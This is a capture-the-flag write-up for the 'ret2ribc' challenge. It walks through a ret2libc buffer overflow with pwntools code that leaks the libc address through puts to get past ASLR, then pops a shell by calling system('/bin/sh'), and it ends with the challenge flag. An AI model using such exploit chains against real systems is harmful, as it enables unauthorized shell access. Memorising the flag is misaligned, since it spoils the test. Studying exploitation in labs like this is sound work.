# ret2ribc

## problem

Announcing ret2ribc, the world's newest and most secure bone database!

see `ret2ribc` file

## solution

we can see in the file that it is vulnerable to a buffer overflow attack. 
this one was extremely difficult for me because i had never done a buffer overflow attack before and knew little about how to do one

if you want a good tutorial, see [here](https://bordplate.no/blog/en/post/interactive-rop-tutorial/) for a tutorial on how to do one

i also used [this article](https://pollevanhoof.be/nuggets/buffer_overflow_linux/3_aslr_ret2libc) to figure out how to bypass ASLR by leaking the address of libc

we run checksec on the file:

```
[*] '/tmp/ret2ribc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

if we run `ldd` multiple times, we can see that ASLR is enabled on our system because the libc.so.6 address changes:

```
quasar@quasar098:/tmp$ ldd ret2ribc
        linux-vdso.so.1 (0x00007ffd768c8000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa4ec0d8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa4ec311000)
quasar@quasar098:/tmp$ ldd ret2ribc
        linux-vdso.so.1 (0x00007fff9fdf1000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f843afc6000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f843b1ff000)
quasar@quasar098:/tmp$ ldd ret2ribc
        linux-vdso.so.1 (0x00007ffed0355000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3a8684b000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f3a86a84000)
```

i will assume that ASLR is enabled the remote machine as well

firstly, we are going to be using pwntools

```py
#!/usr/bin/python3

from pwn import *

locally = True

if locally:
    p = process("./ret2ribc")
    gdb_p = gdb.attach(p, "c")
else:
    p = remote("eth007.me", 42092)
```

now we have a process that we can use

next, we will initialize the other things

```py
libc = ELF("./libc.so.6")
elf = ELF("./ret2ribc")
rop = ROP("./ret2ribc")
```

in order to pop a shell, we need to overflow the buffer to overwrite the next values in the stack

our payload will look something like 

`[padding + address to pop rdi gadget + address to string /bin/sh in libc + address to ret gadget + address to system function in libc]`

to figure out the padding, we use gdb and a cyclic pattern (e.g. `aaaaaaabaaacaaadaaaeaaafaaagaaah`) to figure out how many characters to pad

the way that it works is that when the padding gets taken off the stack, the top of the stack will contain the 
address to the pop rdi gadget, which will make the program execute the `pop rdi` instruction. however, the next
value on the top of the stack after the `pop rdi` gadget address is the address to the string `/bin/sh`, which
means that the value `/bin/sh` will get popped into rdi (register for arg #1 in linux systems)

the execution is then brought to the `ret` instruction which pops the address to the `system` function from libc into rip, so it calls `system("/bin/sh")`

however, because ASLR is enabled, we don't know the address to the functions and strings in libc, because they keep changing, so we have to leak the addres of libc.

```py
p.recvuntil(b"e:")

leak_libc_payload = b"A" * 88 + p64(pop_rdi_address) + p64(puts_got_address)
leak_libc_payload += p64(puts_plt_address) + p64(main_function_address)

p.sendline(leak_libc_payload)

p.recvline()
p.recvline()
leaked_libc_address = int.from_bytes(p.recvline()[:-1], 'little')
leaked_libc_address -= libc.symbols["puts"]
print(f"found leaked libc addr: {leaked_libc_address}")
libc.address = leaked_libc_address
```

we can overflow the buffer and then resume execution at the `pop_rdi` address, and then at the address to puts in the GOT table.

the GOT table contains address of functions used in the code that belong to shared libraries. we have access to `puts`, so we will use that.

by doing this, we know the address of the function `puts` in libc. we have a copy of libc.so.6 (just get it from your local machine), so we know the offset from puts to the start of the libc.

it also restarts the program from main.

```py
p.recvuntil(b"e:")

libc_bin_sh_address = next(libc.search(b"/bin/sh\x00"))
libc_system_address = libc.symbols["system"]
ret_gadget_address = 0x401130

final_payload = b"A" * 88 + p64(pop_rdi_address) + p64(libc_bin_sh_address)
final_payload += p64(ret_gadget_address) + p64(libc_system_address)

p.sendline(final_payload)

p.interactive()
```

now, we execute our final payload because we know the address of the `/bin/sh` string and the `system` function.

the flag is `ictf{shells_are_basically_bones_right?}`

